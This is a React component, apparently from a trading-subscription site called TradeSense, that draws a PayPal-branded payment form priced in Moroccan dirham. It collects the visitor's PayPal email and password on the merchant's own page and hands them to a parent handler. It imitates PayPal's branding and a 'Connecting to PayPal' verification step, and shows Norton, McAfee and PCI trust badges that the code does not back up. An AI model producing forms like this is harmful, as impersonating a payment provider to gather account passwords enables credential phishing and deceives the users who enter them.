import React, { useState, useEffect } from 'react';
import { Card } from './ui/Card';
import { CreditCard, Mail, Lock, CheckCircle2, Shield } from 'lucide-react';

export default function PayPalForm({ onSubmit, onCancel, loading }) {
    const [paypalData, setPaypalData] = useState({
        email: '',
        password: ''
    });
    const [focused, setFocused] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [isProcessing, setIsProcessing] = useState(false);

    const handleInputChange = (field, value) => {
        setPaypalData({ ...paypalData, [field]: value });
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        setIsProcessing(true);
        setTimeout(() => {
            onSubmit(paypalData);
        }, 1500);
    };

    return (
        <div className="space-y-6 animate-in fade-in slide-in-from-top-4 duration-500">
            {/* PayPal Logo Animation */}
            <div className="text-center py-6">
                <div className="inline-flex items-center gap-3 p-6 bg-gradient-to-br from-blue-600/20 to-blue-800/20 rounded-2xl border border-blue-500/30 shadow-[0_0_40px_rgba(59,130,246,0.2)]">
                    <div className="relative">
                        <div className="w-16 h-16 bg-gradient-to-br from-blue-500 to-blue-700 rounded-2xl flex items-center justify-center shadow-lg transform hover:scale-110 transition-transform duration-300">
                            <div className="text-white font-black text-2xl italic">P</div>
                        </div>
                        <div className="absolute -top-1 -right-1 w-5 h-5 bg-gradient-to-br from-sky-400 to-blue-500 rounded-full animate-pulse"></div>
                    </div>
                    <div>
                        <div className="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-blue-600">
                            PayPal
                        </div>
                        <div className="text-xs text-blue-400 font-medium">The safer, easier way to pay</div>
                    </div>
                </div>
            </div>

            {/* Form */}
            <Card className="p-6 border-blue-500/30 bg-gradient-to-br from-blue-950/20 to-slate-950">
                <form onSubmit={handleSubmit} className="space-y-5">
                    {/* PayPal Email */}
                    <div className="relative">
                        <label className="block text-sm font-medium text-slate-300 mb-2">
                            PayPal Email or Mobile Number
                        </label>
                        <div className="relative">
                            <input
                                type="email"
                                value={paypalData.email}
                                onChange={(e) => handleInputChange('email', e.target.value)}
                                onFocus={() => setFocused('email')}
                                onBlur={() => setFocused('')}
                                placeholder="email@example.com"
                                className={`w-full bg-slate-900/50 border rounded-lg px-4 py-3 pr-12 text-white placeholder-slate-600 transition-all duration-300 ${focused === 'email'
                                        ? 'border-blue-500 ring-2 ring-blue-500/20 shadow-[0_0_20px_rgba(59,130,246,0.15)]'
                                        : 'border-slate-700 hover:border-slate-600'
                                    }`}
                                required
                                disabled={isProcessing}
                            />
                            <Mail
                                className={`absolute right-3 top-1/2 -translate-y-1/2 transition-colors duration-300 ${focused === 'email' ? 'text-blue-400' : 'text-slate-600'
                                    }`}
                                size={20}
                            />
                        </div>
                    </div>

                    {/* Password */}
                    <div className="relative">
                        <label className="block text-sm font-medium text-slate-300 mb-2">
                            Password
                        </label>
                        <div className="relative">
                            <input
                                type={showPassword ? 'text' : 'password'}
                                value={paypalData.password}
                                onChange={(e) => handleInputChange('password', e.target.value)}
                                onFocus={() => setFocused('password')}
                                onBlur={() => setFocused('')}
                                placeholder="Enter your PayPal password"
                                className={`w-full bg-slate-900/50 border rounded-lg px-4 py-3 pr-24 text-white placeholder-slate-600 transition-all duration-300 ${focused === 'password'
                                        ? 'border-blue-500 ring-2 ring-blue-500/20 shadow-[0_0_20px_rgba(59,130,246,0.15)]'
                                        : 'border-slate-700 hover:border-slate-600'
                                    }`}
                                required
                                disabled={isProcessing}
                            />
                            <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-2">
                                <button
                                    type="button"
                                    onClick={() => setShowPassword(!showPassword)}
                                    className="text-xs text-blue-400 hover:text-blue-300 font-medium transition-colors"
                                    disabled={isProcessing}
                                >
                                    {showPassword ? 'Hide' : 'Show'}
                                </button>
                                <Lock
                                    className={`transition-colors duration-300 ${focused === 'password' ? 'text-blue-400' : 'text-slate-600'
                                        }`}
                                    size={16}
                                />
                            </div>
                        </div>
                        <a href="#" className="text-xs text-blue-400 hover:text-blue-300 mt-2 inline-block transition-colors">
                            Forgot password?
                        </a>
                    </div>

                    {/* Security Features */}
                    <div className="grid grid-cols-2 gap-3 pt-2">
                        <div className="flex items-center gap-2 p-3 bg-blue-500/5 border border-blue-500/20 rounded-lg">
                            <Shield className="text-blue-400 flex-shrink-0" size={16} />
                            <div className="text-xs text-blue-300">
                                <div className="font-bold">Buyer Protection</div>
                                <div className="text-blue-400/70">100% Secure</div>
                            </div>
                        </div>
                        <div className="flex items-center gap-2 p-3 bg-blue-500/5 border border-blue-500/20 rounded-lg">
                            <CheckCircle2 className="text-blue-400 flex-shrink-0" size={16} />
                            <div className="text-xs text-blue-300">
                                <div className="font-bold">SSL Encrypted</div>
                                <div className="text-blue-400/70">256-bit</div>
                            </div>
                        </div>
                    </div>

                    {/* Payment Info Box */}
                    <div className="p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg space-y-2">
                        <div className="flex justify-between items-center text-sm">
                            <span className="text-slate-300">Merchant</span>
                            <span className="font-bold text-white">TradeSense</span>
                        </div>
                        <div className="flex justify-between items-center text-sm">
                            <span className="text-slate-300">Amount</span>
                            <span className="font-bold text-blue-400 text-lg">{getPriceForDisplay()}</span>
                        </div>
                        <div className="pt-2 border-t border-blue-500/20">
                            <div className="text-xs text-blue-300">
                                You will be charged in Moroccan Dirham (MAD)
                            </div>
                        </div>
                    </div>

                    {/* Processing State */}
                    {isProcessing && (
                        <div className="p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg animate-in fade-in slide-in-from-bottom-2">
                            <div className="flex items-center gap-3">
                                <div className="w-10 h-10 bg-blue-500/20 rounded-full flex items-center justify-center">
                                    <div className="w-5 h-5 border-2 border-blue-400/30 border-t-blue-400 rounded-full animate-spin"></div>
                                </div>
                                <div>
                                    <div className="font-bold text-blue-400">Connecting to PayPal...</div>
                                    <div className="text-xs text-blue-300">Verifying your account</div>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* Buttons */}
                    <div className="flex gap-3 pt-2">
                        <button
                            type="button"
                            onClick={onCancel}
                            disabled={loading || isProcessing}
                            className="flex-1 px-6 py-3 bg-slate-800 hover:bg-slate-700 disabled:bg-slate-900 disabled:text-slate-600 text-white rounded-lg font-medium transition-all duration-300 border border-slate-700 hover:border-slate-600"
                        >
                            Cancel
                        </button>
                        <button
                            type="submit"
                            disabled={loading || isProcessing}
                            className="flex-1 px-6 py-3 bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-500 hover:to-blue-600 disabled:from-slate-700 disabled:to-slate-800 text-white rounded-lg font-bold transition-all duration-300 shadow-[0_0_20px_rgba(59,130,246,0.3)] hover:shadow-[0_0_30px_rgba(59,130,246,0.4)] disabled:shadow-none transform hover:scale-[1.02] active:scale-[0.98]"
                        >
                            {loading ? (
                                <span className="flex items-center justify-center gap-2">
                                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                                    Processing...
                                </span>
                            ) : (
                                `Pay ${getPriceForDisplay()}`
                            )}
                        </button>
                    </div>

                    {/* Terms */}
                    <div className="text-center text-[10px] text-slate-500 pt-2">
                        By clicking "Pay", you agree to PayPal's{' '}
                        <a href="#" className="text-blue-400 hover:text-blue-300">User Agreement</a>
                    </div>
                </form>
            </Card>

            {/* Trust Badges */}
            <div className="flex items-center justify-center gap-4 flex-wrap">
                <div className="flex items-center gap-2 px-3 py-2 bg-slate-900/50 border border-slate-800 rounded-lg">
                    <Shield className="text-blue-400" size={14} />
                    <span className="text-xs text-slate-400">Norton Secured</span>
                </div>
                <div className="flex items-center gap-2 px-3 py-2 bg-slate-900/50 border border-slate-800 rounded-lg">
                    <Lock className="text-blue-400" size={14} />
                    <span className="text-xs text-slate-400">McAfee Protected</span>
                </div>
                <div className="flex items-center gap-2 px-3 py-2 bg-slate-900/50 border border-slate-800 rounded-lg">
                    <CheckCircle2 className="text-blue-400" size={14} />
                    <span className="text-xs text-slate-400">PCI DSS Compliant</span>
                </div>
            </div>
        </div>
    );
}

function getPriceForDisplay() {
    const params = new URLSearchParams(window.location.search);
    const plan = params.get('plan');
    const prices = { starter: '200 DH', pro: '500 DH', elite: '1,000 DH' };
    return prices[plan] || '---';
}
